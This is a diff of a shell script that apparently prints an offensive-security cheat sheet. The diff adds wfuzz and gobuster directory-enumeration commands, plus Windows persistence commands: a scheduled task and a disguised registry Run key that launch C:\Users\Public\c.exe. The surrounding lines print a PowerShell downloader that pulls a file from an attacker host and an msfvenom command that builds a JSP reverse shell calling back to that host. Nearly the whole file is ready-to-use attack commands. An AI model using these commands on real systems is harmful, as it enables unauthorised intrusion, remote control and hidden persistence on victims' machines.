@@ -8,6 +8,11 @@ printf "dirb http://$1"
 printf "\n\n"
 
 printf "dirsearch.py -u http://$ip -e aspx -f -t 20"
+printf "wfuzz -c -w /usr/share/dirb/wordlists/big.txt --hs 403 http://$ip/FUZZ"
+printf "gobuster dir -u http://$ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,htm"
+printf "\n\n"
+
+
 printf "\n\n"
 
 printf "echo $wc=New-Object Net.WebClient>w.ps1 && echo $u=\"http://$1/$3\">>w.ps1 && echo $f=$3>>w.ps1 && echo $wc.DownloadFile($u,$f)>>w.ps1"
@@ -26,6 +31,12 @@ printf "\n\n"
 cat << EOF 
 skipfish -YO -o ~/skipfish http://$1
 EOF
+
+printf "schtasks /create /sc minute /TN \"EMOM\" /TR \"C:\Users\Public\c.exe\""
+printf "\n\n"
+
+printf "reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" /v EROR /t REG_SZ /d \"C:\Users\Public\c.exe\""
+printf "\n\n"
 
 printf "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$1 LPORT=$2 -f raw > rev_shell.jsp"
 printf "\n\n"
